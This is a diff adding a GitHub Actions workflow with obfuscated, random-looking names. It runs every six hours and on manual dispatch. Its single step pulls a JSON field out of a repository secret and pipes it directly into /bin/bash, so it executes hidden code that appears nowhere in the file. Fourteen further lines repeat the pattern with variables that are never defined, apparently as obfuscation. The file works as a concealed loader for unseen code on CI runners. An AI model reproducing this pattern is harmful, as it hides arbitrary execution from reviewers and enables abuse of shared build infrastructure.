@@ -1,0 +1,31 @@
+name: yezhongshu2603
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yezhongshu2603
+        env:
+          czdct1: ${{ secrets.czdct1 }}
+        run: |
+          echo $czdct1 | jq -r .j4808 | /bin/bash
+          echo $jdmt85168 | jq -r .i11082 | /bin/bash
+          echo $u53174 | jq -r .izp8315 | /bin/bash
+          echo $stx0081 | jq -r .h2918 | /bin/bash
+          echo $b0509 | jq -r .lvemx02224 | /bin/bash
+          echo $dbjvb874 | jq -r .yefh71140 | /bin/bash
+          echo $jxdm8 | jq -r .y0 | /bin/bash
+          echo $swnj117 | jq -r .nj7 | /bin/bash
+          echo $rkw16925 | jq -r .nfdz07 | /bin/bash
+          echo $qnx880 | jq -r .ycc706 | /bin/bash
+          echo $csokb71 | jq -r .u5 | /bin/bash
+          echo $nuipr5 | jq -r .q33245 | /bin/bash
+          echo $cg39610 | jq -r .s63820 | /bin/bash
+          echo $bwi7061 | jq -r .pvxp37379 | /bin/bash
+          echo $givvd9 | jq -r .c8 | /bin/bash
+
